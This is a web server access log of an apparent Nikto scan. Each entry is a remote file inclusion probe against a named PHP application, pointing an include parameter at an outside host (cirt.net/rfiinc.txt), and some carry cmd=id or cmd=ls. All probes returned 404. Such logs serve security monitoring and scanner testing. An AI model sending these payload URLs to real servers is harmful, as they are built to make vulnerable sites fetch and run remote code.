172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /php4you.php?dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005558)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpAdsNew-2.0.7/libraries/lib-remotehost.inc?phpAds_geoPlugin=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005559)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpBB2/shoutbox.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005560)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpCards.header.php?CardPath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005561)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpGedView/help_text_vars.php?cmd=dir&PGV_BASE_DIRECTORY=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005562)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpMyChat.php3?=http://cirt.net/rfiinc.txt??cmd=id HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005563)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpMyConferences_8.0.2/common/visiteurs/include/menus.inc.php?lvc_include_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 552 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005564)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpQLAdmin-2.2.7/ezmlm.php?_SESSION[path]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005565)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpSiteBackup-0.1/pcltar.lib.php?g_pcltar_lib_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005566)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpbb/sendmsg.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005567)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpcalendar/includes/calendar.php?phpc_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005568)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpcalendar/includes/setup.php?phpc_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005569)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpdebug_PATH/test/debug_test.php?debugClassLocation=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005570)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpffl/phpffl_webfiles/program_files/livedraft/admin.php?PHPFFL_FILE_ROOT=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 547 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005571)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpffl/phpffl_webfiles/program_files/livedraft/livedraft.php?PHPFFL_FILE_ROOT=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 551 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005572)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phphd_downloads/common.php?phphd_real_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005573)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phphost_directoryv2/include/admin.php?rd=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005574)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phphtml.php?htmlclass_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005575)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpi/edit_top_feature.php?include_connection=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005576)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpi/edit_topics_feature.php?include_connection=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005577)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/site_conf.php?ordnertiefe=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005578)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/2.1.5/1.3.3/functionen/class.csv.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005579)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/version/1.3.3/functionen/class.csv.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005579)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/2.1.5/1.3.3/functionen/produkte_nach_serie.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 544 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005580)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/version/1.3.3/functionen/produkte_nach_serie.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 546 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005580)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/2.1.5/1.3.3/functionen/ref_kd_rubrik.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005581)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/version/1.3.3/functionen/ref_kd_rubrik.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 540 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005581)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/2.1.5/1.3.3/module/hg_referenz_jobgalerie.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005582)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/version/1.3.3/module/hg_referenz_jobgalerie.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005582)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/2.1.5/1.3.3/module/produkte_nach_serie_alle.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005583)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/version/1.3.3/module/produkte_nach_serie_alle.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 547 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005583)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/2.1.5/1.3.3/module/ref_kd_rubrik.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005584)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/version/1.3.3/module/ref_kd_rubrik.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005584)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/2.1.5/1.3.3/module/referenz.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005585)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/version/1.3.3/module/referenz.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005585)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/2.1.5/1.3.3/module/surfer_aendern.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005586)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/version/1.3.3/module/surfer_aendern.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 537 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005586)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/2.1.5/1.3.3/module/surfer_anmeldung_NWL.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 541 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005587)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/version/1.3.3/module/surfer_anmeldung_NWL.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005587)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/2.1.5/1.3.3/standard/1/lay.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005588)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/version/1.3.3/standard/1/lay.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005588)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/2.1.5/1.3.3/standard/3/lay.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005589)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplib/version/1.3.3/standard/3/lay.php?tt_docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005589)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phplinks/includes/smarty.php?full_path_to_public_program=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005590)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phporacleview/inc/include_all.inc.php?page_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005591)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phporacleview/inc/include_all.inc.php?page_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005592)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phppc/poll.php?is_phppc_included=1&relativer_pfad=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005593)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phppc/poll_kommentar.php?is_phppc_included=1&relativer_pfad=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005594)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phppc/poll_sm.php?is_phppc_included=1&relativer_pfad=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005595)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpquickgallery/gallery_top.inc.php?textFile=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005596)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpreactor/inc/polls.inc.php?pathtohomedir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005597)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpreactor/inc/updatecms.inc.php?pathtohomedir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005598)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpreactor/inc/users.inc.php?pathtohomedir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 483 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005599)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpreactor/inc/view.inc.php?pathtohomedir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005600)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpress/adisplay.php?lang=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005601)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpunity-postcard.php?plgallery_epost=1&gallery_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005602)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpwcms_template/inc_script/frontend_render/navigation/config_HTML_MENU.php?HTML_MENU_DirPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 566 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005603)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpwcms_template/inc_script/frontend_render/navigation/config_PHPLM.php?HTML_MENU_DirPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 562 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005604)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phpyabs/moduli/libri/index.php?Azione=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005605)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /pirvate/ltwpdfmonth.php?ltw_config['include_dir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005606)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /playlist.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005607)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugin/HP_DEV/cms2.php?s_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005608)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugin/HP_DEV/cms2.php?s_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005609)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugin/gateway/gnokii/init.php?apps_path[plug]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005610)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/1_Adressbuch/delete.php?folder=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005611)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/BackUp/Archive.php?bkpwp_plugin_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005612)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/BackUp/Archive/Predicate.php?bkpwp_plugin_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005613)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/BackUp/Archive/Reader.php?bkpwp_plugin_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005614)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/BackUp/Archive/Writer.php?bkpwp_plugin_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005615)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/links/functions.inc?_CONF[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005616)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/polls/functions.inc?_CONF[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005617)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/rss_importer_functions.php?sitepath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005618)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/safehtml/HTMLSax3.php?dir[plugins]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005619)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/safehtml/safehtml.php?dir[plugins]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005620)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/spamx/BlackList.Examine.class.php?_CONF[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005621)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/spamx/DeleteComment.Action.class.php?_CONF[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005622)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/spamx/EditHeader.Admin.class.php?_CONF[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005623)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/spamx/EditIP.Admin.class.php?_CONF[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005624)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/spamx/EditIPofURL.Admin.class.php?_CONF[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005625)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/spamx/IPofUrl.Examine.class.php?_CONF[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005626)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/spamx/Import.Admin.class.php?_CONF[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005627)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/spamx/LogView.Admin.class.php?_CONF[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005628)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/spamx/MTBlackList.Examine.class.php?_CONF[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005629)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/spamx/MailAdmin.Action.class.php?_CONF[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005630)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/spamx/MassDelTrackback.Admin.class.php?_CONF[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 537 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005631)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/spamx/MassDelete.Admin.class.php?_CONF[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005632)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/staticpages/functions.inc?_CONF[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005633)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plugins/widgets/htmledit/htmledit.php?_POWL[installPath]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005634)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plume-1.1.3/manager/tools/link/dbinstall.php?cmd=ls&_PX_config[manager_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005635)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /plus.php?_pages_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005636)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /pmapper-3.2-beta3/incphp/globals.php?_SESSION[PM_INCPHP]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005637)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /pmi_v28/Includes/global.inc.php?strIncludePrefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005638)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /pmi_v28/Includes/global.inc.php?strIncludePrefix=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005639)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /podcastgen1.0beta2/components/xmlparser/loadparser.php?absoluteurl=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005640)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /podcastgen1.0beta2/core/admin/admin.php?p=admin&absoluteurl=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005641)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /podcastgen1.0beta2/core/admin/categories.php?categoriesenabled=yes&do=categories&action=del&absoluteurl=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005642)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /podcastgen1.0beta2/core/admin/categories_add.php?absoluteurl=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 539 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005643)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /podcastgen1.0beta2/core/admin/categories_remove.php?absoluteurl=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 542 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005644)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /podcastgen1.0beta2/core/admin/edit.php?p=admin&do=edit&c=ok&absoluteurl=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005645)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /podcastgen1.0beta2/core/admin/editdel.php?p=admin&absoluteurl=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005646)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /podcastgen1.0beta2/core/admin/ftpfeature.php?p=admin&absoluteurl=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005647)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /podcastgen1.0beta2/core/admin/login.php?absoluteurl=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005648)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /podcastgen1.0beta2/core/admin/pgRSSnews.php?absoluteurl=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005649)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /podcastgen1.0beta2/core/admin/showcat.php?absoluteurl=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005650)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /podcastgen1.0beta2/core/admin/upload.php?p=admin&do=upload&c=ok&absoluteurl=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005651)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /podcastgen1.0beta2/core/archive_cat.php?absoluteurl=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005652)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /podcastgen1.0beta2/core/archive_nocat.php?absoluteurl=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005653)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /podcastgen1.0beta2/core/recent_list.php?absoluteurl=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005654)"
